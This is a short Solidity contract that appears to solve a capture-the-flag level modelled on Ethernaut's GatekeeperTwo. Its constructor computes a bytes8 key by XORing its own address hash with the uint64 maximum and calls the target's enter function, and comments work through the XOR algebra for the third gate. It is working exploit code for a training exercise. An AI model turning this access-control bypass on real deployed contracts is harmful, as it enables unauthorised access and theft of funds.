
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

contract FatekeeperTwo {
    constructor(address _target) {
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        _target.call(abi.encodeWithSignature("enter(bytes8)", key));
    }
}



    //GATE 3
    // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
    // a = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ 
    // key = uint64(_gateKey)
    // m = max
    // a ^ key = max
    // a ^ a ^ key = key //property of xor a^a^b = b
    // a ^ max = key
    
   